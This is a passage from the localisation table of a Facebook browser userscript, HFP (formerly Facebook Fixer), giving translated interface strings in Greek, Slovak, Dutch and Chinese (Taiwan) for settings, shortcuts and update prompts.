		'fullAlbumLoaded' : 'η φόρτωση του άλμπουμ ολοκληρώθηκε',
		'Import' : 'Εισαγωγή',
		'ImportConfirm' : 'Είστε σίγουρος ότι θέλετε να εισάγετε αυτές τις ρυθμίσεις;\nΟι τρέχουσες ρυθμίσεις θα χαθούν.',
		'ImportFailure' : 'Προέκυψε σφάλμα κατά την εισαγωγή των ρυθμίσεων.',
		'ImportSuccess' : 'Η εισαγωγή ολοκληρώθηκε. Θέλετε να ανανεώσετε την σελίδα;',
		'Left' : 'Αριστερά',
		'LoadingAllPhotos' : 'Φόρτωση όλων των φωτογραφιών...',
		'loadingFullAlbum' : 'Φόρτωση όλου του άλμπουμ...',
		'LoadingPic' : 'Φόρτωση εικόνας...',
		'LoadPhotosWarning' : 'Η φόρτωση όλων των φωτογραφιών μπορεί να πάρει αρκετή ώρα',
		'Months' : new Array('Ιανουάριος','Φεβρουάριος','Μάρτιος','Απρίλιος','Μάιος','Ιούνιος','Ιούλιος','Αύγουστος','Σεπτέμβριος','Οκτώβριος','Νοέμβριος','Δεκέμβριος'),
		'ProtocolSkype' : 'Κλήση %s μέσω Skype',
		'ProtocolMSN' : 'Συζήτηση με %s μέσω Windows Live',
		'ProtocolYahoo' : 'Συζήτηση με %s μέσω Yahoo Messenger',
		'ProtocolGoogle' : 'Συζήτηση με %s μέσω Google Talk',
		'ReloadErrorPage' : 'Πατήστε για δοκιμή ξανά ή περιμένετε 5 δευτερόλεπτα',
		'Refresh' : 'Ανανέωση',
		'Remove' : 'Αφαίρεση',
		'Right' : 'Δεξιά',
		'ShowBigPictures' : 'Εμφάνιση μεγαλύτερων εικόνων',
		'Signs' : new Array('Αιγόκερως','Υδροχόος','Ιχθείς','Κριός','Ταύρος','Δίδυμος','Καρκίνος','Λέων','Παρθένος','Ζυγός','Σκορπιός','Τοξότης'),
		'today' : 'σήμερα',
		'Translators' : 'Μεταφραστές',
		'UpdateAvailable1' : 'Υπάρχει καινούργια διαθέσιμη έκδοση του HFP',
		'UpdateAvailable2' : 'Θέλετε να την ενημερώσετε τώρα;',
		'UpdateHomepage' : 'Επιστροφή στην Αρχική Σελίδα',
		'UpdateInstall' : 'Εγκατάσταση τώρα',
		'UpdateTomorrow' : 'Υπενθύμιση αύριο',
		'yearsOld' : '%s χρονών'
	},

	// Slovak - Contributed by Peter Miksik (20101028)
	sk : {
		'_language' : 'Slovak',
		'AddToCalendar' : 'Pridať do Kalendára',
		'AddToGoogleCalendar' : 'Pridať do Kalendára Google',
		'all' : 'všetko',
		'All' : 'Všetko',
		'AllPhotosLoaded' : 'Všetky fotografie načítané',
		'Automatic' : 'Automaticky',
		'Birthday' : 'Narodeniny %s',
		'BookmarkAdd' : 'Pridať novú záložku',
		'BookmarkExists' : 'Táto stránka už je v záložkách.\n\nPrejdite na stránku, ktorú chcete pridať medzi záložky a skúste to znova.',
		'BookmarkNamePrompt' : 'Zadajte názov tejto záložky:\n%s',
		'BookmarksConfirmRemoval' : 'Naozaj chcete odstrániť nasledujúce záložky?',
		'BookmarksManage' : 'Spravovať záložky',
		'BookmarksRemoveSelected' : 'Odstrániť vybrané záložky',
		'Bookmarks' : 'Záložky',
		'BrowserUnsupported' : 'Váš prehliadač túto funkciu nepodporuje.',
		'CreatingFile' : 'Vytvorenie súboru',
		'Close' : 'Zavrieť',
		'ConfigureFacebookFixer' : 'Konfigurovať HFP',
		'ConfigureInstructions' : 'Všetky zmeny sú ukladané okamžite, ale niektoré zmeny sa nemusia prejaviť na kartách, ktoré sú už otvorené.',
		'ConfAge' : 'Zobraziť vek ľudí v ich profiloch (ak poskytli celý dátum narodenia)',
		'ConfApplicationWhitelist' : 'Zoznam povolených aplikácií – zadajte ID aplikácií, ktoré chrániť pred skrytím. ID oddeľte medzerou.',
		'ConfAutoBigAlbumPictures' : 'Automaticky pri otvorení stránky zobraziť väčšie obrázky albumu',
		'ConfAutoLoadFullAlbum' : 'Automaticky načítať miniatúry všetkých obrázkov v albume na jednej stránke',
		'ConfAutoLoadTaggedPhotos' : 'Automaticky načítať miniatúry všetkých fotografií s menovkou na jednej stránke (karta Fotky v profiloch ľudí)',
		'ConfAutoReadMore' : 'Automaticky kliknúť na odkazy "čítať ďalej"',
		'ConfBigAlbumPictures' : 'Pridať odkaz na stránkach albumu na zobrazenie väčších verzií všetkých obrázkov na tejto stránke',
		'ConfBigAlbumPicturesBorder' : 'Pridať rámček okolo väčších verzií obrázkov',
		'ConfBookmarks' : 'Pridať na panel vrchnej ponuky podponuku Záložky',
		'ConfBottomBarHoverOpacity' : 'Pri ukázaní myšou',
		'ConfBottomBarOpacity' : 'Priehľadnosť spodného panela s ponukou',
		'ConfCalendarBirthDate' : 'Zahrnúť narodeniny osoby do podrobností udalosti',
		'ConfCalendarFullName' : 'Použiť celé meno osoby ako názov narodenín (namiesto krstného mena)',
		'ConfChatDifferentiate' : 'Použiť tučné písmo a kurzívu na rozlíšenie pripojených a nečinných priateľov',
		'ConfChatHideIdle' : 'Skryť nečinných priateľov',
		'ConfDelayPopupPics' : 'Počkať 0,5 sekundy pred načítaním obrázkov v kontextovom okne',
		'ConfDelayPopupPicsTimeout' : 'Oneskorenie pred zobrazením obrázkov v kontextovom okne, v milisekundách (predvolené=500):',
		'ConfDownloadVideo' : 'Pridať odkaz na prevzatie videí zo stránok s videom (možno budete potrebovať <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">prehrávač FLV</a>)',
		'ConfErrorPageReload' : 'Automaticky po 5 sekundách znova načítať chybové stránky aplikácií',
		'ConfExport' : 'Ak chcete exportovať nastavenia, skopírujte dole uvedený text a uložte ho do súboru.',
		'ConfExternalPopup' : 'Externé obrázky plnej veľkosti v kontextovom okne <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Jazyk pre Facebook Fixer',
		'ConfFacebookTimestamps' : 'Zobraziť časové značky Facebooku (t. j. "pred 3 hodinami")',
		'ConfFBFTimestamps' : 'Pridať časové značky skriptu Facebook Fixer za časové značky Facebooku (t. j. "11:45")',
		'ConfFBFTimestamps24' : 'Zobraziť časové značky skriptu Facebook Fixer v 24-hodinovom formáte',
		'ConfFriendRequestCountInTitle' : 'Zobraziť v názve stránky počet nových žiadostí o priateľstvo',
		'ConfGoogleApps' : 'Vytvoriť odkazy pre Google Calendar kompatibilné s Google Apps',
		'ConfGoogleAppsDomain' : 'Doména',
		'ConfGoogleCalendar' : 'Pridať odkazy na zaradenie narodenín a udalostí do aplikácie <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Jazyk pre <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : 'Skryť príspevky o aplikáciách',
		'ConfHideEgos' : 'Skryť všetky sekcie "ego" (malo by skryť väčšinu odporúčaní Facebooku)',
		'ConfHideEventStories' : 'Skryť príspevky o udalostiach',
		'ConfHideFacebookCountInTitle' : 'Skryť počet nových správ na Facebooku',
		'ConfHideFriendStories' : 'Skryť príspevky o priateľoch',
		'ConfHideGroupStories' : 'Skryť príspevky o skupinách',
		'ConfHideHovercards' : 'Skryť kontextové okná zobrazujúce sa po ukázaní myšou na mená)',
		'ConfHideLikeStories' : 'Skryť príspevky "Páči sa mi to"',
		'ConfHideLinkStories' : 'Skryť príspevky o odkazoch',
		'ConfHideNoteStories' : 'Skryť príspevky o poznámkach',
		'ConfHidePhotoStories' : 'Skryť príspevky o fotkách',
		'ConfHidePlaceStories' : 'Skryť príspevky o miestach',
		'ConfHideProfilePicStories' : 'Skryť príspevky o profilových fotkách',
		'ConfHideRead' : 'Skryť položky, ktoré boli označené ako prečítané',
		'ConfHideRelationshipStories' : 'Skryť príspevky o stave vzťahu',
		'ConfHideStatusStories' : 'Skryť príspevky o statuse',
		'ConfHideVideoStories' : 'Skryť príspevky o videách',
		'ConfHideWallStories' : 'Skryť príspevky o nástenkách',
		'ConfHomeBeta' : 'Zobraziť časť Beta Tester',
		'ConfHomeChat' : 'Zobraziť časť Chat',
		'ConfHomeChatNames' : 'Zobraziť mená v časti Chat',
		'ConfHomeEvents' : 'Zobraziť časť Udalosti',
		'ConfHomeFindFriends' : 'Zobraziť časť Spojte sa s priateľmi',
		'ConfHomeLeftAlign' : 'Zarovnať obsah úvodnej stránky naľavo',
		'ConfHomeLeftColumn' : 'Zobraziť ľavý stĺpec',
		'ConfHomeLeftColumnFixed' : 'Nechať ľavý stĺpec viditeľný aj pri posúvaní nadol',
		'ConfHomeLink' : 'Zobraziť vo vrchnej ponuke odkaz na úvodnú stránku',
		'ConfHomeNavigation' : 'Zobraziť časť Navigácia',
		'ConfHomePokes' : 'Zobraziť časť Štuchnutia',
		'ConfHomeProfile' : 'Zobraziť časť Profil',
		'ConfHomeRecommendations' : 'Zobraziť odporúčania (Ľudia, ktorých poznáte; Odporúčané stránky atď.)',
		'ConfHomeRequests' : 'Zobraziť časť Žiadosti',
		'ConfHomeRightColumn' : 'Zobraziť pravý stĺpec',
		'ConfHomeStretch' : 'Roztiahnuť úvodnú stránku na šírku okna prehľadávača',
		'ConfHomeStretchComments' : 'Roztiahnuť komentáre na hlavnej stránke',
		'ConfiCalendar' : 'Pridať odkazy na prevzatie súboru <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> so všetkými narodeninami',
		'ConfImport' : 'Ak chcete neskôr importovať nastavenia, prepíšte dole uvedený text tým, ktorý ste predtým uložili, a kliknite na "Import".',
		'ConfInboxCountInTitle' : 'Zobraziť v názve stránky počet neprečítaných prijatých správ',
		'ConfLogoutLink' : 'Pridať do vrchnej ponuky odkaz na odhlásenie',
		'ConfNotificationCountInTitle' : 'Zobraziť v názve stránky počet nových upozornení',
		'ConfNewTabSearch' : 'Pri vyhľadávaní otvoriť stlačením Ctrl+Enter výsledky hľadania na novej karte/v novom okne',
		'ConfPageTitle' : 'Odstrániť "Facebook |" z názvu všetkých stránok',
		'ConfPhotoPopup' : 'Väčšie verzie fotiek v kontextovom okne po ukázaní myšou',
		'ConfPopupAutoClose' : 'Automaticky zatvárať kontextové okná s obrázkami',
		'ConfPopupSmartAutoClose' : 'Zabrániť autom. zatvoreniu kontextových okien s obrázkom, ak je na nich kurzor myši',
		'ConfPopupPosition' : 'Umiestnenie kontextového okna s obrázkom',
		'ConfPopupWhileTagging' : 'Zobraziť kontextové okná s obrázkami aj pri označovaní',
		'ConfProcessInterval' : 'Interval spracovania stránky, v milisekundách (predvolené=1000):',
		'ConfProfileLink' : 'Zobraziť na vrchnom paneli s ponukou odkaz na profil',
		'ConfProfilePicPopup' : 'Väčšie verzie profilových fotiek v kontextovom okne po ukázaní myšou',
		'ConfProtocolLinks' : 'Zmeniť ID pre okamžité správy na odkazy spúšťajúce konverzáciu (Google Talk, Windows Live atď.)',
		'ConfSectionAbout' : 'Čo je Facebook Fixer',
		'ConfSectionAdvanced' : 'Spresnenie',
		'ConfSectionEvents' : 'Narodeniny/Udalosti',
		'ConfSectionImportExport' : 'Import/Export',
		'ConfSectionFeeds' : 'Novinky',
		'ConfSectionHomePage' : 'Úvodná stránka',
		'ConfSectionLiveFeed' : 'Aktuality',
		'ConfSectionMenu' : 'Ponuky/Chat',
		'ConfSectionOther' : 'Ďalšie možnosti',
		'ConfSectionPageTitle' : 'Názov stránky',
		'ConfSectionPictures' : 'Obrázky',
		'ConfSectionShortcuts' : 'Klávesové skratky',
		'ConfSecureLinks' : 'Vynútiť zmenu odkazov Facebooku na stránky HTTPS',
		'ConfShortcutList' : '<b>Klávesové skratky</b> (rozlišujú sa malé/veľké písmená):<br /><br /><i>Z ľubovoľnej stránky:</i><br /> <b>A</b> – Albumy/fotky<br /> <b>B</b> – Prepnúť zoznam priateľov (online priatelia)<br /> <b>C</b> – Konfigurácia skriptu Facebook Fixer<br /> <b>D</b> – Narodeniny<br /> <b>E</b> – Udalosti<br /> <b>F</b> – Priatelia<br /> <b>H</b> – Domov<br /> <b>I</b> – Prijaté správy<br /> <b>L</b> – Vybrať odkaz Odhlásiť sa (po odhlásení stlačte Enter)<br /> <b>N</b> – Upozornenia<br /> <b>P</b> – Váš profil<br /> <b>R</b> – Žiadosti<br /> <b>S</b> – Preskočiť na pole Hľadať<br /> <b>T</b> – Preložiť vybraný text<br /> <b>?</b> – Zobraziť informácie o ladení skriptu Facebook Fixer<br /> <b><Esc></b> – Zavrieť kontextové okná vytvorené skriptom Facebook Fixer<br /><br /><i>Zo stránky Domov (filtre)</i>:<br /> <b>a</b> – Stránky<br /> <b>f</b> – Aktuality<br /> <b>g</b> – Skupiny<br /> <b>l</b> – Odkazy<br /> <b>n</b> – Novinky<br /> <b>p</b> – Fotky<br /> <b>s</b> alebo <b>u</b> – Čo robia ostatní<br /> <b>t</b> – Poznámky<br /> <b>v</b> – Videá<br /><br /><i>Z profilov</i>:<br /> <b>i</b> – Informácie<br /> <b>p</b> – Fotky<br /> <b>w</b> – Nástenka<br /> <b>x</b> – Priečinky<br /><br /><i>Zo stránok s navigáciou (dozadu, dopredu atď.)</i><br /> <b><šípka doľava></b> – Dozadu<br /> <b><šípka doprava></b> – Dopredu<br /> <b><shift> + <šípka doľava></b> – Prvá (ak je k dispozícii)<br /> <b><shift> + <šípka doprava></b> – Posledná (ak je k dispozícii)<br /><br /><i>Počas prezerania albumov/fotiek:</i><br /> <b>a</b> – Načítať všetky miniatúry (ak je k dispozícii)<br /> <b>b</b> – Zobraziť veľké obrázky<br /> <b>c</b> – Zobraziť komentáre<br /> <b>k</b> – Späť na album<br /> <b>m</b> – Fotky osoby a mňa<br /><br /><i>Počas prezerania najnovších albumov a nahratých fotiek/fotiek s menovkou:</i><br /> <b>a</b> or  <b>r</b> – Najnovšie albumy<br /> <b>m</b> alebo  <b>u</b> – Nahraté z mobilu<br /> <b>o</b> – Fotky, na ktorých som ja<br /> <b>p</b> – Moje fotky<br /> <b>t</b> alebo  <b>f</b> Menovky priateľov',
		'ConfShortcuts' : 'Povoliť klávesové skratky',
		'ConfSign' : 'Zobraziť znamenie ľudí v ich profiloch (ak poskytli svoj dátum narodenia)',
		'ConfTopBarFixed' : 'Vždy zobraziť vrchný panel s ponukou aj pri posúvaní stránky nadol',
		'ConfTopBarHoverOpacity' : 'Pri ukázaní myšou',
		'ConfTopBarOpacity' : 'Priehľadnosť vrchného panela s ponukou',
		'DownloadVideo' : 'Prevziať video',
		'ExportICalendarFile' : 'Exportovať súbor iCalendar',
		'ExportICalendarFileWarning' : '(Ak máte mnoho priateľov, môže to chvíľu trvať.)',
		'FacebookFixerConflict' : 'Facebook Fixer sa odteraz nazýva HFP.<br /><br />Pretože sa zmenil názov, je potrebné ručne odinštalovať Facebook Fixer z prehliadača, inak budú v konflikte dva skripty medzi sebou navzájom.<br /><br />Ak neviete, ako skript odinštalovať, <a %s>kliknutím sem otvorte pokyny</a>.',
		'fullAlbumLoaded' : 'celý album načítaný',
		'Import' : 'Import',
		'ImportConfirm' : 'Naozaj chcete importovať tieto nastavenia?\nVaše súčasné nastavenia budú stratené.',
		'ImportFailure' : 'Počas pokusu o import nastavení došlo k chybe.',
		'ImportSuccess' : 'Import dokončený. Chcete obnoviť stránku?',
		'Left' : 'Vľavo',
		'LoadingAllPhotos' : 'Načítavajú sa všetky fotky...',
		'loadingFullAlbum' : 'Načítava sa celý album...',
		'LoadingPic' : 'Načítava sa obrázok...',
		'LoadPhotosWarning' : 'Načítavanie všetkých fotiek môže chvíľu trvať',
		'Months' : new Array('Január','Február','Marec','Apríl','Máj','Jún','Júl','August','September','Október','November','December'),
		'ProtocolSkype' : 'Volať %s pomocou Skype',
		'ProtocolMSN' : 'Chatovať s %s pomocou Windows Live',
		'ProtocolYahoo' : 'Chatovať s %s pomocou Yahoo Messenger',
		'ProtocolGoogle' : 'Chatovať s %s pomocou Google Talk',
		'ReloadErrorPage' : 'Kliknite na Skúsiť znova alebo počkajte 5 sekúnd',
		'Refresh' : 'Obnoviť',
		'Remove' : 'Odstrániť',
		'Right' : 'Vpravo',
		'ShowBigPictures' : 'Zobraziť veľké obrázky',
		'Signs' : new Array('Kozorožec','Vodnár','Ryba','Baran','Býk','Blíženci','Rak','Lev','Panna','Váhy','Škorpión','Strelec'),
		'today' : 'dnes',
		'Translators' : 'Prekladatelia',
		'UpdateAvailable1' : 'K dispozícii je aktualizácia skriptu Facebook Fixer.',
		'UpdateAvailable2' : 'Chcete aktualizovať teraz?',
		'UpdateHomepage' : 'Prejsť na dom. stránku',
		'UpdateInstall' : 'Nainštalovať',
		'UpdateTomorrow' : 'Pripomenúť zajtra',
		'yearsOld' : '%s rokov'
	},

	// Dutch - Contributed by Larissa van Sunder (20091107)
	nl : {
		'_language' : 'Dutch',
		'AddToCalendar' : 'Toevoegen aan kalender',
		'AddToGoogleCalendar' : 'Toevoegen aan Google Calender',
		'all' : 'allemaal',
		'All' : 'Allemaal',
		'AllPhotosLoaded' : 'Alle fotos geladen',
		'Automatic' : 'Automatisch',
		'Birthday' : '%s\'s verjaardag',
		'CreatingFile' : 'Folder crëeren',
		'Close' : 'Sluit',
		'ConfigureFacebookFixer' : 'Configureer HFP',
		'ConfigureInstructions' : 'Alle veranderingen worden onmiddelijk opgeslagen, maar sommige veranderingen zullen niet kunnen worden toegepast in vensters die al open zijn',
		'ConfAge' : 'Laat mensen hun leeftijd op hun profiel zien (wanneer zij hun volledige geboortedatum aangeven)',
		'ConfAutoBigAlbumPictures' : 'Laat automatisch grotere album foto\'s zien wanneer de pagina opent.',
		'ConfAutoLoadFullAlbum' : 'Laad automatisch miniaturen voor alle illustraties in een album op een enkele pagina.',
		'ConfAutoLoadTaggedPhotos' : 'Laad automatisch miniaturen voor alle getagde illustraties in een album op een enkele pagina (het foto\'s venster op mensen hun profiel.',
		'ConfAutoReadMore' : 'Klik automatisch op "lees meerdere" links.',
		'ConfBigAlbumPictures' : 'Link toevoegen op album pagina\'s om grotere versies van alle foto\'s op die pagina te laten zien.',
		'ConfBottomBarHoverOpacity' : 'Bij het overscrollen',
		'ConfBottomBarOpacity' : 'Transparantie menu bar aan het einde van de pagina',
		'ConfCalendarBirthDate' : 'Includeer de persoon zijn geboortedatum in de evenementen details.',
		'ConfCalendarFullName' : 'Gebruik de persoon zijn volledige naam voor de titel van verjaardagen (in plaats van alleen de voornaam).',
		'ConfChatDifferentiate' : 'Gebruik dikgedrukt en cursief om te differentiëren tussen beschikbaar en niet beschikbaar.',
		'ConfChatHideIdle' : 'Verberg niet beschikbare vrienden.',
		'ConfDelayPopupPics' : 'Een vertraging toevoegen voor het laten zien van popup foto\'s.',
		'ConfDelayPopupPicsTimeout' : 'Vertraging voor het laten zien van popup foto\'s, in milliseconden (standaard=500):',
		'ConfDownloadVideo' : 'Een link toevoegen voor het downloaden van videos van video pagina\'s. (Je hebt misschien een <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV speler</a> nodig)',
		'ConfErrorPageReload' : 'Automatisch toepassingen error pagina\'s reloaden.',
		'ConfExternalPopup' : 'Popup versies in volledige grootte van externe illustraties. <sup>experimenteel</sup>',
		'ConfFacebookHFPLanguage' : 'Taal voor HFP',
		'ConfFacebookTimestamps' : 'Laat Facebook timestamps zien (bijv. "3 uur geleden").',
		'ConfFBFTimestamps' : 'HFP timestamps toevoegen na Facebook timestamps (bijv. "11:45").',
		'ConfFBFTimestamps24' : 'Laat HFP timestamps zien in 24-uurs formaat.',
		'ConfGoogleApps' : 'Crëer Google Calendar links die werken met Google Apps.',
		'ConfGoogleAppsDomain' : 'Domein',
		'ConfGoogleCalendar' : 'Links toevoegen om verjaardagen en evenementen toe te voegen aan <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Taal voor <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideEventStories' : 'Verberg evenement overzichten in het live overzicht.',
		'ConfHideFanStories' : 'Verberg fan overzichten in het live overzicht.',
		'ConfHideFriendStories' : 'Verberg vriend overzichten in het live overzicht.',
		'ConfHideGroupStories' : 'Verberg groep overzichten in het live overzicht.',
		'ConfHideRead' : 'Verberg delen in het nieuws overzicht die rood gemarkeerd zijn.',
		'ConfHideRelationshipStories' : 'Verberg relatie overzichten in het live overzicht.',
		'ConfHomeFindFriends' : 'Laat de \'In contact komen met vrienden\' sectie zien.',
		'ConfHomeLeftAlign' : 'Links uitlijn de inhoud van de startpagina.',
		'ConfHomePeopleYouMayKnow' : 'Laat de Suggesties sectie zien.',
		'ConfHomePokes' : 'Laat de Porren sectie zien.',
		'ConfHomeRightColumn' : 'Laat de rechter kolom zien.',
		'ConfHomeStretch' : 'Stretch de startpagina naar de wijdte van het venster.',
		'ConfiCalendar' : 'Links toevoegen om een <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> folder met alle verjaardagen te downloaden.',
		'ConfInboxCountInTitle' : 'Laat het aantal ongelezen berichten in je inbox in de titelpagina zien.',
		'ConfNotificationCountInTitle' : 'Laat het aantal nieuwe noticicaties in de titelpagina zien.',
		'ConfNewTabSearch' : 'Open zoek resultaten in een nieuw venster/scherm wanneer CTRL + Enter om te zoeken wordt ingetoetst.',
		'ConfPageTitle' : 'Verwijder "Facebook |" van de titel van elke pagina.',
		'ConfPhotoPopup' : 'Grotere popup versies van foto\'s bij overscrollen.',
		'ConfPopupAutoClose' : 'Sluit popup foto\'s automatisch.',
		'ConfPopupPosition' : 'Positie voor popup foto\'s',
		'ConfProcessInterval' : 'Interval waarop de pagina moet worden verwerkt, in milliseconden (default=1000):',
		'ConfProfilePicPopup' : 'Grotere popup versies van profiel foto\'s bij overscrollen',
		'ConfProtocolLinks' : 'Verander messenger ID\'s van profielen in links die beginnen met een conversatie met hen (Google Talk, Windows Live etc).',
		'ConfSectionAdvanced' : 'Geavanceerd',
		'ConfSectionEvents' : 'Verjaardagen/Evenementen',
		'ConfSectionHomePage' : 'Startpagina',
		'ConfSectionLiveFeed' : 'Live Overzicht',
		'ConfSectionMenu' : 'Toepassingen/Chat',
		'ConfSectionOther' : 'Andere opties',
		'ConfSectionPictures' : 'Foto\'s',
		'ConfSectionShortcuts' : 'Keyboard Sneltoets',
		'ConfSecureLinks' : 'Dwing Facebook links te linken naar HTTPS pagina\'s.',
		'ConfShortcutList' : '<b>Keyboard Shortucts</b> (case sensitive):<br /><br /><i>From any page:</i><br />&nbsp;<b>A</b> - Albums/photos<br />&nbsp;<b>B</b> - Toggle buddy list (online friends)<br />&nbsp;<b>C</b> - HFP configuration<br />&nbsp;<b>D</b> - Birthdays<br />&nbsp;<b>E</b> - Events<br />&nbsp;<b>F</b> - Friends<br />&nbsp;<b>H</b> - Home page<br />&nbsp;<b>I</b> - Inbox<br />&nbsp;<b>L</b> - Select the logout link (press Enter afterwards to log out)<br />&nbsp;<b>N</b> - Notifications<br />&nbsp;<b>P</b> - Your profile<br />&nbsp;<b>R</b> - Requests<br />&nbsp;<b>S</b> - Jump to the search field<br />&nbsp;<b>T</b> - Translate selected text<br />&nbsp;<b>?</b> - Show HFP debug info<br />&nbsp;<b>&lt;escape&gt;</b> - Close pop-ups created by HFP<br /><br /><i>From the home page (filters)</i>:<br />&nbsp;<b>a</b> - Pages<br />&nbsp;<b>f</b> - Live feed<br />&nbsp;<b>g</b> - Groups<br />&nbsp;<b>l</b> - Links<br />&nbsp;<b>n</b> - News feed<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>s</b> or <b>u</b> - Status updates<br />&nbsp;<b>t</b> - Notes<br />&nbsp;<b>v</b> - Videos<br /><br /><i>From profiles</i>:<br />&nbsp;<b>i</b> - Info<br />&nbsp;<b>p</b> - Photos<br />&nbsp;<b>w</b> - Wall<br />&nbsp;<b>x</b> - Boxes<br /><br /><i>From pages with pagination (previous, next, etc)</i><br />&nbsp;<b>&lt;left arrow&gt;</b> - Previous<br />&nbsp;<b>&lt;right arrow&gt;</b> - Next<br />&nbsp;<b>&lt;shift&gt; + &lt;left arrow&gt;</b> - First (when available)<br />&nbsp;<b>&lt;shift&gt; + &lt;right arrow&gt;</b> - Last (when available)<br /><br /><i>While viewing albums/photos:</i><br />&nbsp;<b>a</b> - Load all thumbnails (when available)<br />&nbsp;<b>b</b> - Show big pictures<br />&nbsp;<b>c</b> - View comments<br />&nbsp;<b>k</b> - Back to album<br />&nbsp;<b>m</b> - Photos of (person) and me<br /><br /><i>While viewing recent albums and uploaded/tagged photos:</i><br />&nbsp;<b>a</b> or &nbsp;<b>r</b> - Recent Albums<br />&nbsp;<b>m</b> or &nbsp;<b>u</b> - Mobile uploads<br />&nbsp;<b>o</b> - Photos of me<br />&nbsp;<b>p</b> - My Photos<br />&nbsp;<b>t</b> or &nbsp;<b>f</b> - Tagged friends',
		'ConfShortcuts' : 'Toestaan van sneltoetsen.',
		'ConfSign' : 'Laat mensen hun sterrenbeeld op hun profiel zien (wanneer zij hun geboortedatum aangeven).',
		'ConfTopBarFixed' : 'Behoud de top meny bar op het scherm, zelfs bij het naar beneden scrollen.',
		'ConfTopBarHoverOpacity' : 'Bij overscrollen',
		'ConfTopBarOpacity' : 'Top menu bar transparentie',
		'DownloadVideo' : 'Download Video',
		'ExportICalendarFile' : 'Export iCalendar folder',
		'ExportICalendarFileWarning' : '(Dit duurt wel even als je veel vrienden hebt)',
		'fullAlbumLoaded' : 'volledige album geladen',
		'Left' : 'Links',
		'LoadingAllPhotos' : 'Laad alle foto\'s...',
		'loadingFullAlbum' : 'Laad hele album...',
		'LoadingPic' : 'Laad foto...',
		'LoadPhotosWarning' : 'Het laden van alle foto\'s kan wel even duren',
		'Months' : new Array('januari','februari','maart','april','mei','juni','juli','augustus','september','oktober','november','december'),
		'ProtocolSkype' : 'Bel %s door middel van Skype',
		'ProtocolMSN' : 'Chat met %s door middel van Windows Live',
		'ProtocolYahoo' : 'Chat met %s door middel van Yahoo Messenger',
		'ProtocolGoogle' : 'Chat met %s door middel van Google Talk',
		'Refresh' : 'Vernieuw',
		'ReloadErrorPage' : 'Klik om het nogmaals te proberen, of wacht %s seconden',
		'Remove' : 'Verwijder',
		'Right' : 'Rechts',
		'ShowBigPictures' : 'Laat grote foto\'s zien',
		'Signs' : new Array('Steenbok','Waterman','Vissen','Ram','Stier','Tweelingen','Kreeft','Leeuw','Maagd','Weegschaal','Schorpioen','Boogschutter'),
		'today' : 'vandaag',
		'UpdateAvailable1' : 'Een update is beschikbaar voor HFP',
		'UpdateAvailable2' : 'Will je nu updaten?',
		'UpdateHomepage' : 'Ga naar startpagina',
		'UpdateInstall' : 'Nu installeren',
		'UpdateTomorrow' : 'Herinner me morgen',
		'yearsOld' : '%s jaar oud'
	},

	// Chinese (Taiwan) - Contributed by By Acedia.Liu (20100422)
	zh_tw : {
		'_language' : 'Chinese (Taiwan)',
		'AddToCalendar' : '加到日曆',
		'AddToGoogleCalendar' : '加到Google日曆',
		'all' : '全部',
		'All' : '全部',
		'AllPhotosLoaded' : '讀取所有相片',
		'Automatic' : '自動',
		'Birthday' : '%s\的生日',
		'BookmarkAdd' : '增加新的書籤',
		'BookmarkConfirmRemoval' : '您確定要移除書籤嗎？ "%s"?',
		'BookmarkDoesNotExist' : '此頁面無法加入書籤。\n\n轉到您要刪除的頁面，然後再試一次。',
		'BookmarkExists' : '此頁已加入書籤。\n\n轉到您要加入書籤的頁面，然後再試一次。',
		'BookmarkNamePrompt' : '輸入新的書籤名稱：\n%s',
		'BookmarkRemove' : '移除書籤',
		'Bookmarks' : '我的最愛',
		'BrowserUnsupported' : '您的瀏覽器尚未支援此功能。',
		'CreatingFile' : '創建文件',
		'Close' : '關閉',
		'ConfigureFacebookFixer' : '設定 HFP',
		'ConfigureInstructions' : '改變設定都應立即存檔，如遇到部份功能未生效，表示該功能或許已開放。',
		'ConfAge' : '於個人資料顯示朋友\的年齡（如果他們設定正確無誤的話）。',
		'ConfAutoBigAlbumPictures' : '開啟相簿時自動顯示較大的相簿圖片。',
		'ConfAutoLoadFullAlbum' : '於單一頁面中自動顯示所有相片的縮圖',
		'ConfAutoLoadTaggedPhotos' : '於單一頁面中自動顯示所有標記的相片縮圖 (朋友\的個人資料標籤上)。',
		'ConfAutoReadMore' : '自動點選"繼續閱讀"連結。',
		'ConfBigAlbumPictures' : '新增一個顯示較大圖片版本的連結在相本上。',
		'ConfBookmarks' : '在頂端的選單中新增『加入書籤』的選單',
		'ConfBottomBarHoverOpacity' : 'On mouse-over',
		'ConfBottomBarOpacity' : '底部選單的透明度。',
		'ConfCalendarBirthDate' : '包括朋友\的生日活動詳情。',
		'ConfCalendarFullName' : '使用朋友\的全名作為生日的標題 (而不是只有first name)。',
		'ConfChatDifferentiate' : '使用粗體和斜體區分在線及閒置的好友。',
		'ConfChatHideIdle' : '隱藏閒置的朋友。',
		'ConfDelayPopupPics' : '顯示彈出的圖片前，增加一個短暫的緩衝時間。',
		'ConfDelayPopupPicsTimeout' : '顯示彈出的圖片前延遲時間，以毫秒計算(預設值=500):',
		'ConfDownloadVideo' : '在有短片的頁面新增一個下載連結 (你也許需要 <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV player</a>)',
		'ConfErrorPageReload' : '應用程式錯誤的後5秒自動重新讀取。',
		'ConfExport' : '匯出您的相關設定，複製下列文字，並另存於一個文件檔案。',
		'ConfExternalPopup' : '彈出全尺寸的外連圖片。 <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'HFP的語言選項',
		'ConfFacebookTimestamps' : '顯示Facebook原來的時間戳記 (eg. "3 hours ago").',
		'ConfFBFTimestamps' : '新增HFP的顯示時間戳記 (eg. "11:45").',
